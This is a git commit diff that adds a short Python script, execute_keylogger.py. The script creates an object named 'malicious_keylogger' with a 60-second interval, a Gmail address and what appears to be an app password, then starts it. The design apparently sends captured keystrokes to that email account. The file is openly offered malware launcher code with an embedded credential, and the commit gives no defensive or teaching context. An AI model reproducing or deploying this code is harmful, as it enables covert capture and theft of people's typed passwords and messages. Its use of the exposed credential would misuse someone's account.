dd9f817135556d24d1766ff17d67a62cd09a40fd
Shubhangi-Mittal <88178163+Shubhangi-Mittal@users.noreply.github.com>
2023-05-27 21:55:23 +0530

    Add files via upload

---
+++ execute_keylogger.py
@@ -0,0 +1,12 @@
+import keylogger
+
+
+# Initialize / create keylogger
+import keylogger
+
+
+malicious_keylogger: keylogger.KeyLogger = keylogger.KeyLogger(60, 'demosp953@gmail.com', 'cdssnidpsyvqieru')
+
+# Execute Keylogger
+
+malicious_keylogger.start()
